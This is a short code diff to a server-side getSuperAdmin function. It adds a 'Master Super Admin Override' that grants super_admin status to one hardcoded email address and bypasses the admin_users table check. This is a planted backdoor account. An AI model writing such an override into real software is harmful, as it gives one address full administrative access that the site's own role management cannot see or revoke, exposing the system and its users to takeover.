@@ -13,6 +13,8 @@ async function getSuperAdmin(req) {
   const client = adminClient()
   const { data: { user } } = await client.auth.getUser(token)
   if (!user) return null
+  // Master Super Admin Override
+  if (user.email === 'jappalearn@gmail.com') return { id: user.id, email: user.email, role: 'super_admin', status: 'approved' }
   const { data: admin } = await client
     .from('admin_users')
     .select('id, role, status')
